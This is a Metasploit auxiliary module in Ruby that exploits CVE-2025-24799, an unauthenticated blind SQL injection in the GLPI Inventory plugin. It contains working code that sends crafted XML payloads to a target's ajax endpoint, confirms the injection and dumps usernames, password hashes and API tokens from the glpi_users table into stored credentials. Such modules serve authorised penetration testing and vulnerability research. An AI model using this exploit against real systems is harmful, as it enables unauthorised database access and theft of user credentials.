##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::SQLi
  prepend Msf::Exploit::Remote::AutoCheck

  class SqliObjectError < StandardError; end
  class TargetNotVulnerableError < StandardError; end

  GET_SQLI_OBJECT_FAILED_ERROR_MSG = 'Unable to successfully retrieve an SQLi object'.freeze

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'GLPI Inventory Plugin Unauthenticated Blind Boolean SQLi',
        'Description' => %q{
          GLPI <= 1.0.18 fails to properly sanitize user supplied data when sent inside a `SimpleXMLElement`
          (available to unauthenticated users), prior to using it in a dynamically constructed SQL query.
          As a result, unauthenticated attackers can conduct an SQL injection attack to dump sensitive
          data from the backend database such as usernames and password hashes.

          In order for GLPI to be exploitable the GLPI Inventory plugin must be installed and enabled, and the
          "Enable Inventory" radio button inside the administration configuration also must be checked.
        },
        'Author' => [
          'rz',        # Initial research
          'jheysel-r7' # Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://blog.lexfo.fr/glpi-sql-to-rce.html'],
          [ 'CVE', '2025-24799']
        ],
        'License' => MSF_LICENSE,
        'DisclosureDate' => '2025-03-12',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [],
          'SideEffects' => [IOC_IN_LOGS]
        }
      )
    )

    register_options([
      OptString.new('TARGETURI', [ true, 'The URL of the GLPI application', '/glpi/' ]),
      OptInt.new('MAX_ENTRIES', [ true, 'The maximum  number of entries to dump from the database. More entries will increase module runtime', 6 ])
    ])
  end

  def build_xml(payload)
    <<~EOF
      <?xml version="1.0" encoding="UTF-8"?>
      <xml>
        <QUERY>get_params</QUERY>
        <deviceid><![CDATA[', #{payload}#{', 0' * @extra_columns});#]]></deviceid>
      </xml>
    EOF
  end

  def send_request(payload)
    send_request_cgi({
      'method' => 'POST',
      'uri' => normalize_uri(target_uri.path, '/index.php/ajax/'),
      'headers' => {
        'Content-Type' => 'application/xml'
      },
      'data' =>
         build_xml(payload)
    })
  end

  def verify_extra_columns
    (5..10).each do |extra_cols|
      @extra_columns = extra_cols
      if @sqli.test_vulnerable
        return true
      end
    end
    raise TargetNotVulnerableError, 'This target appears to not be vulnerable'
  end

  def check
    randnum = SecureRandom.random_number(1000)
    @extra_columns = 10
    res = send_request("select #{randnum}=#{randnum}")
    return Exploit::CheckCode::Safe('Inventory is disabled and needs to be enabled in order to be vulnerable') if res&.body == 'Inventory is disabled'

    begin
      @sqli = get_sqli_object
    rescue SQLExecutionError => e
      return CheckCode::Unknown("#{e.class}: #{e.message}")
    end

    return Exploit::CheckCode::Unknown(GET_SQLI_OBJECT_FAILED_ERROR_MSG) if @sqli == GET_SQLI_OBJECT_FAILED_ERROR_MSG

    begin
      verify_extra_columns
    rescue TargetNotVulnerableError => e
      return Exploit::CheckCode::Safe("#{e.class}: #{e.message}")
    end
    Exploit::CheckCode::Vulnerable('Time based blind boolean injection succeeded')
  end

  def get_sqli_object
    create_sqli(dbms: MySQLi::TimeBasedBlind) do |payload|
      res = send_request(payload)
      raise SqliObjectError, 'Module failed to create SQLi object' unless res
    end
  end

  def run
    @extra_columns = 10
    begin
      @sqli ||= get_sqli_object
    rescue SQLExecutionError => e
      fail_with(Failure::Unknown, "#{e.class}: #{e.message}")
    end

    fail_with(Failure::UnexpectedReply, GET_SQLI_OBJECT_FAILED_ERROR_MSG) unless @sqli

    begin
      verify_extra_columns
    rescue TargetNotVulnerableError => e
      fail_with(Failure::NoTarget, "#{e.class}: #{e.message}")
    end

    creds_table = Rex::Text::Table.new(
      'Header' => 'glpi_users',
      'Indent' => 1,
      'Columns' => %w[user password api_token]
    )

    print_status('Extracting credential information')

    users = @sqli.dump_table_fields('glpi_users', %w[name password api_token], '', datastore['MAX_ENTRIES'])

    users.each do |(user, password, api_token)|
      creds_table << [user, password, api_token]
      create_credential({
        workspace_id: myworkspace_id,
        origin_type: :service,
        module_fullname: fullname,
        username: user,
        private_type: :nonreplayable_hash,
        jtr_format: Metasploit::Framework::Hashes.identify_hash(password),
        private_data: password,
        service_name: 'GLPI',
        address: datastore['RHOSTS'],
        port: datastore['RPORT'],
        protocol: 'tcp',
        status: Metasploit::Model::Login::Status::UNTRIED
      })
    end
    print_line creds_table.to_s
  end
end
